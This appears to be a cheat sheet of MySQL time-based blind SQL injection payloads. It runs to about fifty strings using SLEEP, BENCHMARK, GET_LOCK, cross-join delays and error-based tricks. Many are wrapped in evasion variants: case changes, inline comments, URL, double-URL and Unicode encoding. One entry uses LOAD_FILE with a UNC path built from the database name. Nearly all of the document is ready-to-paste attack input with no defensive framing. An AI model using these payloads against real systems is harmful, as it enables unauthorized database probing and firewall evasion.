# MySQL

These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.

- **' AND SLEEP(5) --**  
  Standard SLEEP for 5 seconds.
- **'||SLEEP(5) --**  
  Concatenation SLEEP.
- **' AND BENCHMARK(1000000,MD5(1)) --**  
  BENCHMARK heavy MD5 computation.
- **' AND IF(1=1,SLEEP(5),0) --**  
  Conditional IF SLEEP.
- **' aNd SlEeP(5) --**  
  Case variation SLEEP.
- **'/*comment*/AND/*comment*/SLEEP(5) --**  
  Inline comments bypass.
- **' AND SLEEP/*foo*/(5) --**  
  Function comment bypass.
- **%27%20AND%20SLEEP(5)%20--**  
  URL-encoded SLEEP.
- **%2527%20AND%20SLEEP(5)%20--**  
  Double URL SLEEP.
- **\u0027 AND SLEEP(5) --**  
  Unicode single quote SLEEP.
- **' AND sleep ( 5 ) --**  
  Inline spaces SLEEP.
- **' AND BENCHMARK(5000000,SHA1(1)) --**  
  BENCHMARK SHA1 heavy.
- **' OR SLEEP(5) --**  
  OR SLEEP delay.
- **' UNION SELECT SLEEP(5) --**  
  UNION SLEEP.
- **' HAVING SLEEP(5) --**  
  HAVING SLEEP.
- **' ORDER BY SLEEP(5) --**  
  ORDER BY SLEEP.
- **' GROUP BY SLEEP(5) --**  
  GROUP BY SLEEP.
- **' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a) --**  
  Subquery SLEEP.
- **' AND RAND() + SLEEP(5) --**  
  RAND nested SLEEP.
- **' AND GET_LOCK('lock',5) --**  
  GET_LOCK delay.
- **' aNd BeNcHmArK(1000000,mD5(1)) --**  
  Case BENCHMARK.
- **%27%20AND%20BENCHMARK%281000000%2CMD5%281%29%29%20--**  
  URL BENCHMARK.
- **' AND/* */SLEEP(5)/* */ --**  
  Comment-wrapped SLEEP.
- **' AND S LEEP(5) --**  
  Spaced function name.
- **' AND/**/SLEEP(5)/**/ --**  
  Full comment wrap.
- **' AND SLEEP(5)#**  
  Hash comment SLEEP.
- **' AND SLEEP(5)--+**  
  Plus comment SLEEP.
- **' OR IF(1=1,SLEEP(5),0) --**  
  OR conditional SLEEP.
- **%27%20OR%20SLEEP(5)%20--**  
  URL OR SLEEP.
- **\u0027\u0020AND\u0020SLEEP(5)\u0020--**  
  Unicode spaced SLEEP.
- **' AND CONV('a',SLEEP(5),2) --**  
  CONV nested SLEEP.
- **' AND (SELECT * FROM (SELECT SLEEP(5))a) --**  
  Nested subquery SLEEP.
- **' AND SLEEP(5) AND '1'='1**  
  AND chained SLEEP.
- **' AND SLEEP(5)='**  
  Incomplete string SLEEP.
- **' UNION ALL SELECT SLEEP(5) --**  
  UNION ALL SLEEP.
- **' AND BENCHMARK(1000000,ENCODE('1','2')) --**  
  BENCHMARK ENCODE heavy.
- **' AND SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/**  
  Multi-comment bypass.
- **' AND (SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2) --**  
  Cross-join tables count.
- **' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1) --**  
  RAND error heavy computation.
- **' AND SLEEP(5) RLIKE SLEEP(5) --**  
  RLIKE nested SLEEP.
- **%27%20AND%20SLEEP%285%29%20RLIKE%20SLEEP%285%29%20--**  
  URL RLIKE SLEEP.
- **' AND ELT(1=1,SLEEP(5)) --**  
  ELT conditional SLEEP.
- **' PROCEDURE ANALYSE(SLEEP(5),1) --**  
  PROCEDURE nested SLEEP.
- **' AND JSON_ARRAY_APPEND(SLEEP(5),1) --**  
  JSON nested SLEEP.
- **' AND ExtractValue(1,concat(0x5c,(BENCHMARK(1000000,MD5(1))))) --**  
  ExtractValue BENCHMARK.
- **' AND UpdateXML(1,concat(0x5c,(BENCHMARK(1000000,MD5(1)))),1) --**  
  UpdateXML BENCHMARK.
- **' AND MULTIPOINT((SELECT * FROM (SELECT * FROM (SELECT SLEEP(5))a)b)) --**  
  Geometry nested SLEEP.
- **' AND LOAD_FILE(concat('\\\\',(SELECT database()))) --**  
  LOAD_FILE heavy path.
- **' AND (SELECT COUNT(*) FROM information_schema.columns a, information_schema.columns b) --**  
  Columns cross-join.

